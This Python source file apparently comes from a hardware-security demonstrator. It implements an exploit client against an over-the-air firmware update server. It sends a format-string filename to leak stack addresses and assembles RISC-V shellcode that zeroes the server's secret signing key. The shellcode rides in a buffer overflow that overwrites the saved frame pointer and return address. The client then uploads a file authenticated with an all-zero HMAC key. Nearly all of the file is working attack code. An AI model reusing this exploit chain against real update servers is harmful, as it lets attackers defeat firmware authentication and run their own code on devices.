"""
Project: SSITH CyberPhysical Demonstrator
Name: ota_client.py
Author: Ethan Lew
Date: 07 June 2021

Hack OTA Client
"""
import requests
import os
import subprocess
import hmac


class HackOtaClient:
    # Ascii info
    ASCII_LOWERCASE_X = 0x78 # 'x' = 0x78 = 120

    # Payload sizes
    PAYLOAD_SIZE = 96 # bytes
    POINTER_SIZE = 8  # bytes
    KEY_SIZE = 8 # bytes

    # Calculated offsets
    BUFFER_POINTER_OFFSET = {}
    BUFFER_POINTER_OFFSET['FreeBSD'] = 128
    BUFFER_POINTER_OFFSET['Debian'] = BUFFER_POINTER_OFFSET['FreeBSD']
    NEXT_FRAME_POINTER_OFFSET = {}
    NEXT_FRAME_POINTER_OFFSET['FreeBSD'] = 304
    NEXT_FRAME_POINTER_OFFSET['Debian'] = NEXT_FRAME_POINTER_OFFSET['FreeBSD']
    THIS_FRAME_POINTER_OFFSET = {}
    THIS_FRAME_POINTER_OFFSET['FreeBSD'] = 224
    THIS_FRAME_POINTER_OFFSET['Debian'] = THIS_FRAME_POINTER_OFFSET['FreeBSD']

    # Address of the ota_secret_key variable
    # (gdb) p &ota_secret_key
    # $1 = (char (*)[64]) 0x147a0 <ota_secret_key>
    KEY_ADDRESS = {'FreeBSD': 0x147a0, 'Debian': 0x165b0}
    RETURN_ADDRESS = {'FreeBSD': 0x11c74, 'Debian': 0x11da4}

    PAYLOAD_ASM = "payload.asm"
    PAYLOAD_ELF = "payload.elf"
    PAYLOAD_BIN = "payload.bin"

    @staticmethod
    def send_request(base_url: str, srvc_name: str, arg):
        """form request and patch ota client"""
        try:
            resp = requests.patch(f"{base_url}/{srvc_name}/{len(arg)}", arg, timeout=1.0)
            print(resp.status_code)
            print(resp.content)
            return resp.status_code, resp.content
        except Exception as exc:
            print(f"<OTA Update Server> Error occured: {exc}")
            return 500, "Error in send_request"

    def __init__(self, base_url, platform='Debian', debug=False):
        print(f"<{self.__class__.__name__}> Url: {base_url}, platform: {platform}")
        base_url
        self.url = base_url
        self.platform = platform
        self.debug = debug

        # state -- will attempt to get pointer info
        self.leaked_pointer = None
        self.buffer_pointer = None
        self.next_frame_pointer = None
        self.this_frame_pointer = None

    def request_upload_file(self, file_bytes: bytes)->(bool, str):
        """
        Attempt to upload file.
        Returns a tuple - bool for was upload succesful (true/false),
        and string containing the server request/response (so it can be displayed on hacker kiosk)
        """
        # Upload the file
        #print(">>> Attempting to upload file (pre-hack).")
        #print(url +"/file/{}".format(len(filename)))
        return self.send_request(self.url, "file", file_bytes)

    def request_authenticate_message(self, message_digest: bytes):
        return self.send_request(self.url, "signature", message_digest)

    def request_filename(self, filename: str):
        if self.debug:
            print(f">>> Requesting to upload a filename: {filename}")
        return self.send_request(self.url, "filename", filename)

    def get_stack_address(self)->(bool,str):
        """
        Attempt to get stack address by sending a malicious filename that leaks the stack address.
       Returns a tuple - bool for was the attempt succesfull (true/false),
        and string containing the server request/response (so it can be displayed on hacker kiosk)
        Exceptions must be handled as the connection might be killed by SSITH hardware.
        """
        if self.debug:
            print(">>> Sending evil filename to get leaked stack pointer.")
        filename = '.elf%p%p%p%p%p'
        code, content = self.request_filename(filename)
        if code != 200:
            return False, code
        if self.debug:
            print("Parsing {}".format(content))
        idx = content.find(self.ASCII_LOWERCASE_X,6) - 1
        self.leaked_pointer = int(content[idx:idx+12],16)
        self.buffer_pointer = self.leaked_pointer + self.BUFFER_POINTER_OFFSET[self.platform]
        self.next_frame_pointer = self.leaked_pointer + self.NEXT_FRAME_POINTER_OFFSET[self.platform]
        self.this_frame_pointer = self.leaked_pointer + self.THIS_FRAME_POINTER_OFFSET[self.platform]
        if self.debug:
            print(">>> Leaked stack pointer: " + hex(self.leaked_pointer))
            print(">>> Calculated buffer_pointer: " + hex(self.buffer_pointer))
            print(">>> Calculated next_frame_pointer: " + hex(self.next_frame_pointer))
            print(">>> Calculated this_frame_pointer: " + hex(self.this_frame_pointer))
        return True, content

    def form_payload(self):
        # Malicious payload
        # Set the secret key to zero
        # t3 - stores KEY_ADDRESS
        # t4 - stores idx value
        # t5 - secret key length
        # t6 - buffer address (beginning of "program")
        if not self.buffer_pointer:
            self.get_stack_address()

        return [
            "li t3, {}\n".format(hex(self.KEY_ADDRESS[self.platform])), # load key address
            "li t4, 0\n", # load index and zero it out
            "li t5, 64\n", # secret key length
            "li t6, {}\n".format(hex(self.buffer_pointer)), # load key address
            "1:\n",
            "    beq t4, t5, 2f\n",
            "    sb zero, 0(t3)\n",
            "    addi t3, t3, 1\n",
            "    addi t4, t4, 1\n",
            "    j 1b\n",
            "2:\n",
            "    li ra, {}\n".format(hex(self.RETURN_ADDRESS[self.platform])), # set the proper return address
            "    ret\n",
        ]

    def write_payload(self):
        if self.debug:
            print(">>> Generating malicious payload source file.")
        with open(HackOtaClient.PAYLOAD_ASM, "w") as f:
            f.writelines(self.form_payload())

    def compile_payload(self):
        if self.debug:
            print(">>> Building malicious payload.")
        assert os.path.exists(HackOtaClient.PAYLOAD_ASM)
        cmd = f"riscv64-unknown-elf-as -march=rv64ima {HackOtaClient.PAYLOAD_ASM} -o {HackOtaClient.PAYLOAD_ELF}"
        print(subprocess.call(cmd,shell=True))
        assert os.path.exists(HackOtaClient.PAYLOAD_ELF)
        cmd = f"riscv64-unknown-elf-objcopy -O binary --only-section=.text {HackOtaClient.PAYLOAD_ELF} {HackOtaClient.PAYLOAD_BIN}"
        print(subprocess.call(cmd,shell=True))
        assert os.path.exists(HackOtaClient.PAYLOAD_BIN)

        # Bytes representing the next frame pointer $fp and the buffer pointer
        # Total 16 bytes
        # For example:
        # 0xfffff630	0x0000003f	0x00011768	0x00000000
        fp_bytes = self.next_frame_pointer.to_bytes(self.POINTER_SIZE, byteorder='little')
        ra_bytes = self.buffer_pointer.to_bytes(self.POINTER_SIZE, byteorder='little')

        # read data from temporary payload file
        with open(HackOtaClient.PAYLOAD_BIN, "r+b") as f:
            payload_bytes = f.read()
            # make the payload a total of PAYLOAD_SIZE bytes while appending fp/ra_bytes
            payload_bytes = payload_bytes + \
                            bytes(self.PAYLOAD_SIZE - len(payload_bytes) -
                                  len(fp_bytes) - len(ra_bytes)) + \
                            fp_bytes + ra_bytes

        # rewrite the file, so we know what we actually sent
        with open(HackOtaClient.PAYLOAD_BIN, "w+b") as f:
            f.write(payload_bytes)

        return payload_bytes

    def change_secret_key(self)->(bool,str):
        """
        Attempt to change the secret key to zeros, after the stack address has been recovered.
        Returns a tuple - bool for was the attempt succesfull (true/false),
        and string containing the server request/response (so it can be displayed on hacker kiosk)
        Exceptions must be handled as the connection might be killed by SSITH hardware.
        """
        self.form_payload()
        self.write_payload()
        self.update_file_bytes = self.compile_payload()
        code, content = self.request_filename(self.update_file_bytes)
        if code == 200:
            return True, content
        else:
            return False, code

    def hack_server(self)->(bool,str):
        """
        Hack sequence is as follows (see specs/OTA_server_hack_sequence.png):
        1) Get Stack Address
          a) send malicious filename
          b) leak stack address
        2) Change secret key
          a) send malicious payload as a filename
          b) filename set (and the secrey key has changed)
        """
        success = True
        if not self.leaked_pointer:
            success = success and self.get_stack_address()[0]
        return success and self.change_secret_key()[0]

    def prepare_file_for_upload(self, update_path):
        """
        Read file and update internal variables
        """
        if self.debug:
            print(f">>> Preparing file for upload: {update_path}")
        self.update_filename = os.path.basename(update_path)
        with open(update_path, "r+b") as f:
            # read data from the update file
            self.update_file_bytes = f.read()

    def upload_file(self, update_path):
        print(f"Preparing file for upload: {update_path}")
        self.prepare_file_for_upload(update_path)
        print(f"Requesting filename: {self.update_filename}")
        self.request_filename(self.update_filename)
        print(f"Requesting to upload a file of lenght {len(self.update_file_bytes)}")
        self.request_upload_file(self.update_file_bytes)
        print(f"Requesting to authenticate the file")
        return self.request_authenticate_message(self.get_hmac().digest())

    def upload_and_execute_file(self, update_path, tryToHack=True)->(bool, str):
        """
        Attempts to upload and authenticate a file
        If it fails, attempt o hack the server and retry
        """
        print(f"OTA client attempting to upload a file: {update_path}")
        if not os.path.isfile(update_path):
            res = f">>> Specified file {update_path} does not exist, exiting"
            if self.debug:
                print(res)
            return (False,res)

        # Try to upload file
        code, content = self.upload_file(update_path)
        content = str(content)
        # Evaluate results
        if code != 200:
            res = f"Server response error: {code}"
            if self.debug:
                print(res)
            return False, res
        if "Verification OK" in content:
            if self.debug:
                print(content)
            return True, "Verification OK"

        # Code was 200, but verification failed - try to hack
        if tryToHack:
            self.hack_server()

        # Try to upload the file again
        code, content = self.upload_file(update_path)
        content = str(content)

        # Evaluate results
        if code != 200:
            res = f"Server response error: {code}"
            if self.debug:
                print(res)
            return False, res
        if "Verification OK" in content:
            if self.debug:
                print(content)
            return True, "Verification OK"

    def get_hmac(self):
        # compute the HMAC for the file, with our "key" (64 zero bytes)
        emptykey = bytes(self.KEY_SIZE)
        digest = hmac.new(emptykey, msg=self.update_file_bytes, digestmod='sha256')
        return digest
